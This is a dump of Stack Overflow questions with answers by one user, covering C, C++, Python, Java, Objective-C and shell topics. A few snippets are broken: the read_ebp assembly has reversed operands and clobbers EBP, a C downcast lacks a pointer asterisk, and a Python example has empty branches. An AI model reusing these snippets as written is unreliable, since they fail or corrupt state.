<p>DISCLAIMER: Untested, test first and use at your own risk.</p>
"
"<p>How do I obtain a stack trace of addresses on Windows without using dbghelp.dll?</p>

<p>I don't need to know what the symbols or function names associated with the addresses, I just want the list of addresses -- something similar to <strong><a href=""http://www.gnu.org/software/libtool/manual/libc/Backtraces.html"" rel=""nofollow"">backtrace of *nix systems</a></strong>. </p>

<p>Thanks!</p>
","9530","Adam Rosenfield","<p>If you want to do this <em>extremely</em> non-portably, you can just read the EBP register and walk the stack yourself.  This will only work for the x86 architecture, and it also assumes that the C runtime you're using properly initializes EBP to 0 before calling the first function.</p>

<pre><code>uint32_t read_ebp(void)
{
    uint32_t my_ebp;
    __asm
    {
        mov ebp, my_ebp
    }

    return my_ebp;
}

void backtrace(void)
{
    uint32_t ebp = read_ebp();

    printf(""backtrace:\n"");

    while(ebp != 0)
    {
        printf(""0x%08x\n"", ebp);
        ebp = ((uint32_t *)ebp)[1];
    }
}
</code></pre>
"
"<p>Python provides a nice method for getting length of an eager iterable, <code>len(x)</code> that is. But I couldn't find anything similar for lazy iterables represented by generator comprehensions and functions. Of course, it is not hard to write something like:</p>

<pre><code>def iterlen(x):
  n = 0
  try:
    while True:
      next(x)
      n += 1
  except StopIteration: pass
  return n
</code></pre>

<p>But I can't get rid of a feeling that I'm reimplementing a bicycle.</p>

<p>(While I was typing the function, a thought struck my mind: maybe there really is no such function, because it ""destroys"" its argument. Not an issue for my case, though).</p>

<p>P.S.: concerning the first answers - yes, something like <code>len(list(x))</code> would work too, but that drastically increases the usage of memory.</p>

<p>P.P.S.: re-checked... Disregard the P.S., seems I made a mistake while trying that, it works fine. Sorry for the trouble.</p>
","9530","Adam Rosenfield","<p>There isn't one because you can't do it in the general case - what if you have a lazy infinite generator?  For example:</p>

<pre><code>def fib():
    a, b = 0, 1
    while True:
        a, b = b, a + b
        yield a
</code></pre>

<p>This never terminates but will generate the Fibonacci numbers.  You can get as many Fibanacci numbers as you want by calling <code>next()</code>.</p>

<p>If you really need to know the number of items there are, then you can't iterate through them linearly one time anyways, so just use a different data structure such as a regular list.</p>
"
"<p>Yesterday, I have a discussion with my colleagues about HTTP. It is asked why HTTP is designed in plain text way. Surely, it can be designed in binary way just like TCP protocol, using flags to represents different kinds of method(POST, GET) and variables (HTTP headers). So, why HTTP is designed in such way? Is there any technical or historical reasons?</p>
","9530","Adam Rosenfield","<p>With HTTP, the <em>content</em> of a request is almost always orders of magnitude larger than the protocol overhead.  Converting the protocol into a binary one would save very little bandwidth, and the easy debugability that a text protocol offers <em>easily</em> trumps the minor bandwidth savings of a binary protocol.</p>
"
"<p>I'm looking for examples of specifying files in a tree structure, for example, for specifying the set of files to search in a grep tool.  I'd like to be able to include and exclude files and directories by name matches.  I'm sure there are examples out there, but I'm having a hard time finding them. </p>

<p>Here's an example of a possible syntax:</p>

<pre><code>*.py *.html
*.txt *.js
-*.pyc
-.svn/
-*combo_*.js
</code></pre>

<p>(this would mean include file with extensions .py .html .txt .js, exclude .pyc files, anything under a .svn directory, and any file matching <em>combo</em>*.js)</p>

<p>I know I've seen these sorts of specifications in other tools before.  Is this ringing any bells for anyone?</p>
","9530","Adam Rosenfield","<p>If you're using bash, you can use the <code>extglob</code> extension to get some nice globbing functions.  Enable it as follows:</p>

<pre><code>shopt -s extglob
</code></pre>

<p>Then you can do things like the following:</p>

<pre><code># everything but .html, .jpg or ,gif files
ls -d !(*.html|*gif|*jpg)
# list file9, file22 but not fileit
ls file+([0-9])
# begins with apl or un only
ls -d +(apl*|un*)
</code></pre>

<p>See also <a href=""http://aplawrence.com/Words2005/2005_05_25.html"" rel=""nofollow"">this page</a>.</p>
"
"<p>How can I create a method in the @implementation of a class without defining it in the @interface?</p>

<p>For example, I have a constructor that does some initialisation and then reads data from a file.  I want to factor out the file-reading code into a separate method that I then call from within the constructor.  I don't want to define this method in the header because it's private only to this @implementation context.</p>

<p>Is this possible?</p>

<p>Here's my example.  I have a little program that read's a Todo task-list from a file.</p>

<p>Here is the @interface:</p>

<pre><code>@interface TDTaskList : NSObject {
  NSString* name; // The name of this list.
  NSMutableArray* tasks;  // The set of tasks in this list.
}

-(id)initListOfName:(NSString*)aName;
-(NSArray*)loadListWithName:(NSString*)aName;

@end
</code></pre>

<p>And here is part of the @implementation:</p>

<pre><code>-(id)initListOfName:(NSString*)aName {
  if (self = [super init]) {
    name = aName;

    NSArray* aTasks = [self loadListWithName:aName];
    tasks = [NSMutableArray arrayWithArray:aTasks];
  }

  return self;
}

-(NSArray*)loadListWithName:(NSString*)aName {
  // TODO This is a STUB till i figure out how to read/write from a file ...

  TDTask* task1 = [[TDTask alloc] initWithLabel:@""Get the Milk.""];
  TDTask* task2 = [[TDTask alloc] initWithLabel:@""Do some homework.""];

  return [NSArray arrayWithObjects:task1, task2, nil];
}
</code></pre>

<p>What I want to do is to <strong>not</strong> have to define the following in the interface:</p>

<pre><code>-(NSArray*)loadListWithName:(NSString*)aName;
</code></pre>
","9530","Adam Rosenfield","<p>You could use <a href=""http://en.wikipedia.org/wiki/Objective-C#Categories"" rel=""nofollow"">categories</a>:</p>

<pre><code>// In TDTaskList.m
@interface TDTaskList(TDTaskListPrivate)
-(id)initListOfName:(NSString*)aName;
-(NSArray*)loadListWithName:(NSString*)aName;
@end

@implementation TDTaskList(TDTaskListPrivate)

// implementation of initListOfName and loadListWithName ...

@end
</code></pre>
"
"<p>For my Java game server I send the Action ID of the packet which basically tells the server what the packet is for. I want to map each Action ID (an integer) to a function. Is there a way of doing this without using a switch?</p>
","9530","Adam Rosenfield","<p>Java does not have first-class function pointers.  In order to achieve similar functionality, you have to define and implement an interface.  You can make it easier using anonymous inner classes, but it's still not very pretty.  Here's an example:</p>

<pre><code>public interface PacketProcessor
{
    public void processPacket(Packet packet);
}

...

PacketProcessor doThing1 = new PacketProcessor()
{
    public void processPacket(Packet packet)
    {
        // do thing 1
    }
};
// etc.

// Now doThing1, doThing2 can be used like function pointers for a function taking a
// Packet and returning void
</code></pre>
"
"<p>I want to get the UCS-2 code points for a given UTF-8 string. For example the word ""hello"" should become something like ""0068 0065 006C 006C 006F"". Please note that the characters could be from any language including complex scripts like the east asian languages.</p>

<p>So, the problem comes down to ""convert a given character to its UCS-2 code point""</p>

<p>But how? Please, any kind of help will be very very much appreciated since I am in a great  hurry.</p>

<p>Thanks in advance</p>

<p><hr></p>

<p><em>Transcription of questioner's response posted as an answer</em></p>

<p>Thanks for your reply, but it needs to be done in PHP v 4 or 5 but not 6.</p>

<p>The string will be a user input, from a form field.</p>

<p>I want to implement a PHP version of utf8to16 or utf8decode like</p>

<pre><code>function get_ucs2_codepoint($char)
{
    // calculation of ucs2 codepoint value and assign it to $hex_codepoint
    return $hex_codepoint;
}
</code></pre>

<p>Can you help me with PHP or can it be done with PHP with version mentioned above?</p>

<p>Thank you again.</p>
","9530","Adam Rosenfield","<p>Use an existing utility such as <a href=""http://www.gnu.org/software/libiconv/"">iconv</a>, or whatever libraries come with the language you're using.</p>

<p>If you insist on rolling your own solution, read up on the <a href=""http://en.wikipedia.org/wiki/Utf-8"">UTF-8</a> format.  Basically, each code point is stored as 1-4 bytes, depending on the value of the code point.  The ranges are as follows:</p>

<ul>
<li>U+0000 — U+007F: 1 byte: 0xxxxxxx</li>
<li>U+0080 — U+07FF: 2 bytes: 110xxxxx 10xxxxxx</li>
<li>U+0800 — U+FFFF: 3 bytes: 1110xxxx 10xxxxxx 10xxxxxx</li>
<li>U+10000 — U+10FFFF: 4 bytes: 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</li>
</ul>

<p>Where each x is a data bit.  Thus, you can tell how many bytes compose each code point by looking at the first byte: if it begins with a 0, it's a 1-byte character.  If it begins with 110, it's a 2-byte character.  If it begins with 1110, it's a 3-byte character.  If it begins with 11110, it's a 4-byte character.  If it begins with 10, it's a non-initial byte of a multibyte character.  If it begins with 11111, it's an invalid character.</p>

<p>Once you figure out how many bytes are in the character, it's just a matter if bit twiddling.  Also note that UCS-2 cannot represent characters above U+FFFF.</p>

<p>Since you didn't specify a language, here's some sample C code (error checking omitted):</p>

<pre><code>wchar_t utf8_char_to_ucs2(const unsigned char *utf8)
{
  if(!(utf8[0] &amp; 0x80))      // 0xxxxxxx
    return (wchar_t)utf8[0];
  else if((utf8[0] &amp; 0xE0) == 0xC0)  // 110xxxxx
    return (wchar_t)(((utf8[0] &amp; 0x1F) &lt;&lt; 6) | (utf8[1] &amp; 0x3F));
  else if((utf8[0] &amp; 0xF0) == 0xE0)  // 1110xxxx
    return (wchar_t)(((utf8[0] &amp; 0x0F) &lt;&lt; 12) | ((utf8[1] &amp; 0x3F) &lt;&lt; 6) | (utf8[2] &amp; 0x3F));
  else
    return ERROR;  // uh-oh, UCS-2 can't handle code points this high
}
</code></pre>
"
"<p>I'm checking if two strings <code>a</code> and <code>b</code> are permutations of each other, and I'm wondering what the ideal way to do this is in Python. From the Zen of Python, ""There should be one -- and preferably only one -- obvious way to do it,"" but I see there are at least two ways:</p>

<pre><code>sorted(a) == sorted(b)
</code></pre>

<p>and</p>

<pre><code>all(a.count(char) == b.count(char) for char in a)
</code></pre>

<p>but the first one is slower when (for example) the first char of <code>a</code> is nowhere in <code>b</code>, and the second is slower when they are actually permutations.</p>

<p>Is there any better (either in the sense of more Pythonic, or in the sense of faster on average) way to do it? Or should I just choose from these two depending on which situation I expect to be most common?</p>
","9530","Adam Rosenfield","<p>Go with the first one - it's much more straightforward and easier to understand.  If you're actually dealing with incredibly large strings and performance is a real issue, then don't use Python, use something like C.</p>

<p>As far as the Zen of Python is concerned, that there should only be one obvious way to do things refers to small, simple things.  Obviously for any sufficiently complicated task, there will always be zillions of small variations on ways to do it.</p>
"
"<p>I'm trying to read the target file/directory of a shortcut (<code>.lnk</code>) file from Python. Is there a headache-free way to do it? The <a href=""http://www.i2s-lab.com/Papers/The_Windows_Shortcut_File_Format.pdf"">.lnk spec [PDF]</a> is way over my head.
I don't mind using Windows-only APIs.</p>

<p>My ultimate goal is to find the <code>""(My) Videos""</code> folder on Windows XP and Vista. On XP, by default, it's at <code>%HOMEPATH%\My Documents\My Videos</code>, and on Vista it's <code>%HOMEPATH%\Videos</code>. However, the user can relocate this folder. In the case, the <code>%HOMEPATH%\Videos</code> folder ceases to exists and is replaced by <code>%HOMEPATH%\Videos.lnk</code> which points to the new <code>""My Videos""</code> folder. And I want its absolute location.</p>
","9530","Adam Rosenfield","<p>Alternatively, you could try using <a href=""http://msdn.microsoft.com/en-us/library/bb762181(VS.85).aspx"" rel=""nofollow"">SHGetFolderPath()</a>.  The following code might work, but I'm not on a Windows machine right now so I can't test it.</p>

<pre><code>import ctypes

shell32 = ctypes.windll.shell32

# allocate MAX_PATH bytes in buffer
video_folder_path = ctypes.create_string_buffer(260)

# 0xE is CSIDL_MYVIDEO
# 0 is SHGFP_TYPE_CURRENT
# If you want a Unicode path, use SHGetFolderPathW instead
if shell32.SHGetFolderPathA(None, 0xE, None, 0, video_folder_path) &gt;= 0:
    # success, video_folder_path now contains the correct path
else:
    # error
</code></pre>
"
"<p>I have a macro that looks like this:</p>

<pre><code>#define coutError    if (VERBOSITY_SETTING &gt;= VERBOSITY_ERROR)    ods()
</code></pre>

<p>where ods() is a class that behaves similarly to cout, and VERBOSITY_SETTING is a global variable. There are a few of these for different verbosity settings, and it allows the code to look something like this:</p>

<pre><code>if (someErrorCondition)
{
    // ... do things relating to the error condition ...

    coutError &lt;&lt; ""Error condition occurred"";
}
</code></pre>

<p>And there is functionality in this framework to set the verbosity, etc. However, the obvious pattern breaks when not using braces in something like this:</p>

<pre><code>void LightSwitch::TurnOn()
{
    if (!PowerToSwitch)
        coutError &lt;&lt; ""No power!"";
    else
        SwitchOn = true;
}
</code></pre>

<p>because of the macro, will turn into this:</p>

<pre><code>void LightSwitch::TurnOn()
{
    if (!PowerToSwitch)
        if (VERBOSITY_SETTING &gt;= VERBOSITY_ERROR)
            ods() &lt;&lt; ""No power!"";
        else
            SwitchOn = true;
}
</code></pre>

<p>Which is not the intended functionality of the if statement.</p>

<p>Now, I understand a way to fix this macro properly so it doesn't cause this problem, but I'd like to run an audit on the code and find any place that has this pattern of ""if (...) coutError &lt;&lt; ...; else"" to find out if there are any other cases where this happens to make sure that when fixing the macro, it will indeed be correct functionality.</p>

<p>I can use any language/tool to find this, I just want to know the best way of doing that.</p>
","9530","Adam Rosenfield","<p>Don't bother trying to find all of the locations in your code where a logic error is occurring -- fix the problem at its source!  Change the macro so that there's no possibility of error:</p>

<pre><code>#define coutError if(VERBOSITY_SETTING &lt; VERBOSITY_ERROR); else ods()
</code></pre>

<p>Note that what I've done here is inverted the test, added an empty statement for the <code>then</code> clause, and put the output object in the <code>else</code> clause.  This still allows you to use <code>&lt;&lt; foo &lt;&lt; bar</code> after the macro, and if you have a trailing <code>else</code> clause belonging to a different <code>if</code> statement, it will get matched up properly, since it expands like so:</p>

<pre><code>if(foo)
    coutError &lt;&lt; bar;
else
    baz();
</code></pre>

<p>becomes</p>

<pre><code>if(foo)
    if(VERBOSITY_SETTING &lt; VERBOSITY_ERROR)
        ;
    else
        ods() &lt;&lt; bar;
else
    baz();
</code></pre>
"
"<p>I have a structure</p>

<pre><code>typedef struct my_s {

   int x;
   ...
} my_T;

my_t * p_my_t;
</code></pre>

<p>I want to set the address of <code>p_my_t</code> to <code>NULL</code> and so far this is how I've tried to do this:</p>

<pre><code>memset (&amp;p_my_t, 0, sizeof(my_t*))
</code></pre>

<p>This doesn't not look right to me though. What is the correct way of doing this?</p>

<hr>

<p><em>Amendment to question - asking a radically more complex question</em>:</p>

<p>Here is what I am trying to do:</p>

<ul>
<li>Two processes, A and B</li>
<li>malloc p_my_t in A, B has N threads and can access it</li>
<li>Start deleting in A but I can not simply free it since threads in B may still using it.</li>
<li>So I call a function, pass address of p_my_t to B to set its address to NULL in B so no other threads in B can use anymore</li>
<li>After call back from B, I then free memory in A</li>
</ul>

<p><em>NB: there is no standard way to manage memory allocations via shared memory between processes.  You will have to do some rather careful thinking about what is going on.</em></p>
","9530","Adam Rosenfield","<p>What exactly are you trying to do?  <code>p_my_t</code> is already a pointer, but you haven't allocated memory for it.  If you want to set the pointer to NULL, simply do</p>

<pre><code>p_my_t = NULL;
</code></pre>

<p>Trying to dereference this pointer will result in a segmentation fault (or access violation on Windows).</p>

<p>Once the pointer actually pointers to something (e.g. via <code>malloc()</code> or by assigning to it the address of a <code>struct my_T</code>), then you can properly <code>memset()</code> it:</p>

<pre><code>memset(p_my_t, 0, sizeof(struct my_T));
</code></pre>

<p>This will zero out the entire structure, setting all fields to zero.</p>
"
"<p>I'm using a mac and looking to batch convert a large amount of eps files and create jpg previews of each. I'm looking for preferably a command-line utility, or some type of workflow to easily batch a large number of files. </p>

<p>Thanks for any ideas or input</p>
","9530","Adam Rosenfield","<p><a href=""http://www.imagemagick.org"">ImageMagick</a> should be exactly what you're looking for.  Once you have it installed, just use the <code>convert</code> utility:</p>

<pre><code>convert file.eps -resize 25% preview.jpg  # create jpg thumbnail at 25% size
</code></pre>
"
"<p>Sometimes it's necessary to modify Windows registry settings during an application install.  I've recently been frustrated by applications that don't restore these settings when they are uninstalled.  As I thought more about this, it occurs to me that there may not be a good (or valid) way to save and restore registry settings.  Take the following sequence of events for example:</p>

<ol>
<li>Application A owns the Open action for file extension <code>.abc</code>.</li>
<li>Application B is installed, and hijacks the Open action for file extension <code>.abc</code>.</li>
<li>Application A is uninstalled.</li>
<li>Application B is uninstalled.</li>
</ol>

<p>At step 3, if Application A is smart enough, it will detect that it no longer owns the Open action and will therefore skip any attempt to restore it.</p>

<p>At step 4, is there any valid action that Application B can take? </p>

<ul>
<li>Doing nothing leaves the Open action pointing to a deleted executable.</li>
<li>Restoring the pointer to Application A is likewise a deleted executable.</li>
<li>Asking the user is not allowed since this is typically considered way beyond the technical skills of the typical user.  If you don't agree, then substitute a different registry change in steps 1 and 2 that you think would be out of scope for the user to answer.</li>
<li>Deleting the action will likewise require the user to make an uninformed decision at a later time, or else make some function unavailable to the user.</li>
</ul>

<p>This is only one of many bad situations that I can envision where there is no obvious one-and-only ""correct"" solution.  My next project will require registry changes during install, and I'd like to know the best or recommended practice for the uninstall.  Unfortunately, I've been burned by bad uninstall practices in current commercial packages, so I'm aware that there's no consensus on best practice here, and it's either a lot of work to do it right, or else a design flaw in the Registry, or both.</p>

<p>This is a very real programming problem for me.  I'm tagging it Subjective because I'm not sure there's any one-size-fits-all <strong><em>right</em></strong> answer to this.  Please feel free to disagree.</p>
","9530","Adam Rosenfield","<p>If you're writing Application B, then I'd say don't hijack the Open action for the .abc extension in the first place.  During install, ask the user if he wants to associate .abc files with your program.  During uninstall, check if your program is still associated.  If so, disassociate the file extension, otherwise leave it alone.</p>

<p>If there's another application that wants to still be associated with .abc files after you uninstall B, tough - make the user fix it.  After all, he consented to associate .abc files with your application and then uninstalled your application.</p>
"
"<p>My idea of program:</p>

<p>I have a dictionary:</p>

<pre><code>options = { 'string' : select_fun(function pointer),
'float' : select_fun(function pointer),
'double' : select_fun(function pointer)
}
</code></pre>

<p>whatever type comes single function <code>select_fun(function pointer)</code> gets called.
Inside <code>select_fun(function pointer)</code>,I will have diff functions for float, double and so on.</p>

<p>Depending on function pointers, specified function will get called.</p>

<p>I don't know whether my programming knowledge is good or bad, still I need help.</p>
","9530","Adam Rosenfield","<p>Could you be more specific on what you're trying to do?  You don't have to do anything special to get function pointers in Python -- you can pass around functions like regular objects:</p>

<pre><code>def plus_1(x):
    return x + 1

def minus_1(x):
    return x - 1

func_map = {'+' : plus_1, '-' : minus_1}

func_map['+'](3)  # returns plus_1(3) ==&gt; 4
func_map['-'](3)  # returns minus_1(3) ==&gt; 2
</code></pre>
"
"<p>I am trying to return an array Data Member from one smaller 2D Array Object, and trying to insert the array into a larger 2D array object. But when attempting this, I came into two problems.</p>

<p>First problem is that I want to return the name of the 2D array, but I do not know how to properly syntax to return 2D Array name.</p>

<p>This is what my 2D Array data member looks like</p>

<pre>
private:
int pieceArray[4][4];
// 2D Smaller Array
</pre>

<p>and I want to return this array into a function, but this one causes a compiler error:</p>

<pre>
int Piece::returnPiece()
{
    return pieceArray; //not vaild
    // return the 2D array name
}
</pre>

<p>I tired using this return type and it worked:</p>

<pre>
int Piece::returnPiece()
{
    return pieceArray[4][4];
}
</pre>

<p>But I am unsure if this is what I want, as I want to return the array and all of it's content.</p>

<p>The other problem is the InsertArray() function, where I would put the returnPiece() function in the InsertArray()'s argument.</p>

<p>The problem with the InsertArray() is the argument, heres the code for it:</p>

<pre>
void Grid::InsertArray( int arr[4][4] ) //Compiler accepts, but does not work
{
    for(int i = 0; i &lt x_ROWS ; ++i)
    {
         for (int j = 0; j &lt y_COLUMNS ; ++j)
         {
             squares[i][j] = arr[i][j];
         }
    }
}
</pre>

<p>The problem with this is that it does not accept my returnPiece(), and if i remove the ""[4][4]"", my compiler does not accept.</p>

<p>Mostly all these are syntax errors, but how do I solve these problems?</p>

<ol>
<li>Returning the whole pieceArray in returnPiece()</li>
<li>The correct syntax for the argument in InsertArray()</li>
<li>The argument of InsertArray() accepting the returnPiece()</li>
</ol>

<p>These 3 are the major problems that I need help with, and had the same problem when I attempt to use the pointer pointer method. Does anyone know how to solve these 3 problems?</p>
","9530","Adam Rosenfield","<p>When passing your array around, you have to decide whether or not you want to make a copy of the array, or if you just want to return a pointer to the array.  For returning arrays, you can't (easily) return a copy - you can only return a pointer (or reference in C++).  For example:</p>

<pre><code>// Piece::returnPiece is a function taking no arguments and returning a pointer to a
// 4x4 array of integers
int (*Piece::returnPiece(void))[4][4]
{
    // return pointer to the array
    return &amp;pieceArray;
}
</code></pre>

<p>To use it, call it like so:</p>

<pre><code>int (*arrayPtr)[4][4] = myPiece-&gt;returnPiece();
int cell = (*arrayPtr)[i][j];  // cell now stores the contents of the (i,j)th element
</code></pre>

<p>Note the similarity between the type declaration and using it - the parentheses, dereferencing operator <code>*</code>, and brackets are in the same places.</p>

<p>Your declaration for <code>Grid::InsertArray</code> is correct - it takes one argument, which is a 4x4 array of integers.  This is call-by-value: whenever you call it, you make a copy of your 4x4 array, so any modification you make are not reflected in the array passed in.  If you instead wanted to use call-by-reference, you could pass a pointer to an array instead:</p>

<pre><code>// InsertArray takes one argument which is a pointer to a 4x4 array of integers
void Grid::InsertArray(int (*arr)[4][4])
{
     for(int i = 0; i &lt; x_ROWS; i++)
     {
         for(int j = 0; j &lt; y_COLUMNS ; j++)
             squares[i][j] = (*arr)[i][j];
     }
}
</code></pre>

<p>These type declarations with pointers to multidimensional arrays can get really confusing fast.  I recommend making a <code>typedef</code> for it like so:</p>

<pre><code>// Declare IntArray4x4Ptr to be a pointer to a 4x4 array of ints
typedef int (*IntArray4x4Ptr)[4][4];
</code></pre>

<p>Then you can declare your functions much more readable:</p>

<pre><code>IntArray4x4Ptr Piece::returnPiece(void) { ... }
void Grid::InsertArray(IntArray4x4Ptr arr) { ... }
</code></pre>

<p>You can also use the <a href=""http://gd.tuwien.ac.at/linuxcommand.org/man_pages/cdecl1.html"" rel=""nofollow"">cdecl</a> program to help decipher complicated C/C++ types.</p>
"
"<p>In Java, it would look like this:</p>

<pre><code>class Foo
{
  float[] array;
}

Foo instance = new Foo();
instance.array = new float[10];
</code></pre>
","9530","Adam Rosenfield","<p>You can just use a pointer:</p>

<pre><code>float *array;
// Allocate 10 floats -- always remember to multiple by the object size
// when calling malloc
array = (float *)malloc(10 * sizeof(float));
...
// Deallocate array -- don't forget to do this when you're done with your object
free(array);
</code></pre>

<p>If you're using Objective-C++, you could instead do:</p>

<pre><code>float *array;
array = new float[10];
...
delete [] array;
</code></pre>
"
"<p>When the Java compiler autoboxes a primitive to the wrapper class, what code does it generate behind the scenes?  I imagine it calls:</p>

<ul>
<li>The valueOf() method on the wrapper</li>
<li>The wrapper's constructor</li>
<li>Some other magic?</li>
</ul>
","9530","Adam Rosenfield","<p>You can use the <code>javap</code> tool to see for yourself.  Compile the following code:</p>

<pre><code>public class AutoboxingTest
{
    public static void main(String []args)
    {
        Integer a = 3;
        int b = a;
    }
}
</code></pre>

<p>To compile and disassemble:</p>

<pre><code>javac AutoboxingTest.java
javap -c AutoboxingTest
</code></pre>

<p>The output is:</p>

<pre><code>Compiled from ""AutoboxingTest.java""
public class AutoboxingTest extends java.lang.Object{
public AutoboxingTest();
  Code:
   0:   aload_0
   1:   invokespecial   #1; //Method java/lang/Object.""&lt;init&gt;"":()V
   4:   return

public static void main(java.lang.String[]);
  Code:
   0:   iconst_3
   1:   invokestatic    #2; //Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;
   4:   astore_1
   5:   aload_1
   6:   invokevirtual   #3; //Method java/lang/Integer.intValue:()I
   9:   istore_2
   10:  return

}
</code></pre>

<p>Thus, as you can see, autoboxing invokes the static method <code>Integer.valueOf()</code>, and autounboxing invokes <code>intValue()</code> on the given <code>Integer</code> object.  There's nothing else, really - it's just syntactic sugar.</p>
"
"<p>I have the following doubts on header files usage.</p>

<p><strong>1 - Include guards placing after comments</strong></p>

<pre><code>/* Copyright Note and licence information (multiple lines) */
#ifndef FOO_H
#define FOO_H
// Header file contents
#endif
</code></pre>

<p>Herb Sutter says in his ""C++ coding standards"" book that code like the above is problematic. He is saying the ""#ifndef"" statements should appear in the first line of the header file. I haven't felt this as convincing. Is this followed by you guys/gals in header files?</p>

<p><strong>2 - Using namespaces in header files</strong></p>

<pre><code>#ifndef FOO_H
#define FOO_H
namespace FooNameSpace{
    // Header file contents
}
#endif
</code></pre>

<p>Is the above code using correct practice? I mean, do you use namespaces in header files? I know why importing a namespace in header file is pointless but what about a declaration like the above?</p>

<p>If the above one is the correct method, how do you do ""<em>forward declaration</em>"" of a class which is in another namespace? Is it like</p>

<pre><code>#ifndef FOO_H
#define FOO_H
namespace AnotherNameSpace{
    class AnotherFoo; // forward declaration
}

namespace FooNameSpace{
    // Use AnotherFoo here
}
#endif
</code></pre>

<p>The ""<em>forward declaration</em>"" is the only method to avoid ""<em>cyclic dependency</em>"", correct?</p>
","9530","Adam Rosenfield","<ol>
<li><p>The order of the include guards and the comments is purely a matter of style - it won't have any measurable effect on speed of compilation.</p></li>
<li><p>Namespaces absolutely should be used in header files for declaring functions, classes, globals, etc.  What you should <em>not</em> do is use <code>using</code> statements in header files -- it's impossible to unuse something in a source file that includes it, and you shouldn't force includers to add extra stuff to the global scope.  If you need to use things from other namespaces in your headers, fully qualify every name.  It can be a pain sometimes, but it's really the right thing to do.</p></li>
</ol>

<p>Examples:</p>

<pre><code>// WRONG!
using namespace std;
class MyClass
{
    string stringVar;
};

// RIGHT
class MyClass
{
    std::string stringVar;
};
</code></pre>

<p>As for forward declarations of classes in other namespaces, you've got it exactly right.  Just remember to always qualify <code>AnotherFoo</code> as <code>AnotherNameSpace::AnotherFoo</code> when you reference it inside your header.  Indeed, forward declarations are the only way to break cyclic dependencies.</p>
"
"<p>I am compiling some benchmarks, and it says that I can try the option gcc-serial instead of only gcc, can anyone please explain the difference between gcc and gcc serial?.</p>

<p>The place where that appears is <a href=""http://parsec.cs.princeton.edu/download/tutorial/parsec-tutorial.pdf"" rel=""nofollow"">here</a> and it is mentioned for example in the slide 71. It is mentioned in more places but in none of them say what is gcc-serial.</p>

<p>Thank you.</p>
","9530","Adam Rosenfield","<p>I've never heard of <code>gcc-serial</code>, and I've used <code>gcc</code> for quite a while.  Can you clarify more precisely what your benchmarks are telling you?  Maybe you meant ""<code>gcc -serial</code>"" (with a space after <code>gcc</code> and before <code>-serial</code>)?  Even in that, case though, I still don't know, since I can't find any mention of a <code>-serial</code> option in my <code>gcc</code> manual.</p>

<p>One version of <code>gcc</code> I'm using has the <code>-mserialize-volatile</code> and <code>-mno-serialize-volatile</code> options, which enable and disable respectively the generation of code that ensures the sequential consistency of <a href=""http://en.wikipedia.org/wiki/Volatile_variable"" rel=""nofollow"">volatile memory accesses</a>.</p>
"
"<p>I'm working on making a simple server application with python, and I'm trying to get the IP to bind the listening socket to. An example I looked at uses this: </p>

<pre><code>HOST = gethostbyaddr(gethostname())
</code></pre>

<p>With a little more processing after this, it should give me just the host IP as a string. This should return the IPv4 address. But when I run this code, it returns my IPv6 address. Why does it do this and how can I get my IPv4 address?</p>

<p>If its relevant, I'm using windows vista and python 2.5</p>
","9530","Adam Rosenfield","<p><a href=""http://docs.python.org/library/socket.html#socket.gethostbyaddr"" rel=""nofollow""><code>gethostbyaddr()</code></a> takes an IP address as a parameter, not a hostname, so I'm surprised it's working at all without throwing an exception.  If instead you meant <a href=""http://docs.python.org/library/socket.html#socket.gethostbyname"" rel=""nofollow""><code>gethostbyname()</code></a>, then your results are more surprising, since that function claims not to support IPv6.  <a href=""http://stackoverflow.com/questions/415407/why-does-gethostbyaddrgethostname-return-my-ipv6-ip#415417"">Harley's answer</a> explains how to correctly get your IP address.</p>
"
"<p>Can someone please share a set of nifty preprocessor hacks (ANSI C89/ISO C90 compatible please) which enable some kind of ugly (but usable) object-orientation in C? I am familiar with a few different object-oriented languages, so please don't respond with answers like ""Learn C++!"". I have read ""<a href=""http://www.planetpdf.com/codecuts/pdfs/ooc.pdf"">Object-Oriented Programming With ANSI C</a>"" (beware: <strong>pdf</strong>) and several other interesting solutions, but I'm mostly interested in yours :-)!</p>

<p><hr /></p>

<p>See also <a href=""http://stackoverflow.com/questions/351733/can-you-write-object-oriented-code-in-c"" title=""Can you write object oriented code in C?"">Can you write object oriented code in C?</a></p>
","9530","Adam Rosenfield","<p>I would advise against preprocessor (ab)use to try and make C syntax more like that of another more object-oriented language.  At the most basic level, you just use plain structs as objects and pass them around by pointers:</p>

<pre><code>struct monkey
{
    float age;
    bool is_male;
    int happiness;
};

void monkey_dance(struct monkey *monkey)
{
    /* do a little dance */
}
</code></pre>

<p>To get things like inheritance and polymorphism, you have to work a little harder.  You can do manual inheritance by having the first member of a structure be an instance of the superclass, and then you can cast around pointers to base and derived classes freely:</p>

<pre><code>struct base
{
    /* base class members */
};

struct derived
{
    struct base super;
    /* derived class members */
};

struct derived d;
struct base *base_ptr = (struct base *)&amp;d;  // upcast
struct derived derived_ptr = (struct derived *)base_ptr;  // downcast
</code></pre>

<p>To get polymorphism (i.e. virtual functions), you use function pointers, and optionally function pointer tables, also known as virtual tables or vtables:</p>

<pre><code>struct base;
struct base_vtable
{
    void (*dance)(struct base *);
    void (*jump)(struct base *, int how_high);
};

struct base
{
    struct base_vtable *vtable;
    /* base members */
};

void base_dance(struct base *b)
{
    b-&gt;vtable-&gt;dance(b);
}

void base_jump(struct base *b, int how_high)
{
    b-&gt;vtable-&gt;jump(b, how_high);
}

struct derived1
{
    struct base super;
    /* derived1 members */
};

void derived1_dance(struct derived1 *d)
{
    /* implementation of derived1's dance function */
}

void derived1_jump(struct derived1 *d, int how_high)
{
    /* implementation of derived 1's jump function */
}

/* global vtable for derived1 */
struct base_vtable derived1_vtable =
{
    &amp;derived1_dance, /* you might get a warning here about incompatible pointer types */
    &amp;derived1_jump   /* you can ignore it, or perform a cast to get rid of it */
};

void derived1_init(struct derived1 *d)
{
    d-&gt;super.vtable = &amp;derived1_vtable;
    /* init base members d-&gt;super.foo */
    /* init derived1 members d-&gt;foo */
}

struct derived2
{
    struct base super;
    /* derived2 members */
};

void derived2_dance(struct derived2 *d)
{
    /* implementation of derived2's dance function */
}

void derived2_jump(struct derived2 *d, int how_high)
{
    /* implementation of derived2's jump function */
}

struct base_vtable derived2_vtable =
{
   &amp;derived2_dance,
   &amp;derived2_jump
};

void derived2_init(struct derived2 *d)
{
    d-&gt;super.vtable = &amp;derived2_vtable;
    /* init base members d-&gt;super.foo */
    /* init derived1 members d-&gt;foo */
}

int main(void)
{
    /* OK!  We're done with our declarations, now we can finally do some
       polymorphism in C */
